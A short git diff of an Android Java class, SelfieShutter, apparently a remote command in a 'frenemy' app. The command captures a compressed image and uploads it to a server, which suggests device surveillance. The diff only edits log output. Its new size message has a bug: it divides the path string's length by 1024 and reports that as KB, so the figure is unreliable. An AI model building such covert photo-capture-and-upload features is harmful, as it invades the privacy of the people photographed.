@@ -137,7 +137,7 @@ public class SelfieShutter extends BaseCommand {
                     BitmapUtils.saveBitmap(loadedImage, cmpPath);
                     callback.onInfo("Compressed image saved: " + cmpPath);
 
-                    callback.onInfo("Uploading image");
+                    callback.onInfo("Uploading image: " + (cmpPath.length() / 1024) + "KB");
                     new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                         @Override
                         public void onReadyToRequest(String apiKey, String frenemyId) {
@@ -159,7 +159,7 @@ public class SelfieShutter extends BaseCommand {
                                     try {
                                         final com.theah64.frenemy.android.utils.Response uploadResp = new com.theah64.frenemy.android.utils.Response(OkHttpUtils.logAndGetStringBody(response));
                                         final String imageUrl = uploadResp.getJSONObjectData().getString("download_link");
-                                        callback.onFinish("Image uploaded:" + CommonUtils.getIMGSRC(imageUrl));
+                                        callback.onFinish("Image uploaded:" + CommonUtils.getIMGSRC(imageUrl, 200, 200));
                                         cmpFile.delete();
                                     } catch (com.theah64.frenemy.android.utils.Response.ResponseException | JSONException e) {
                                         e.printStackTrace();
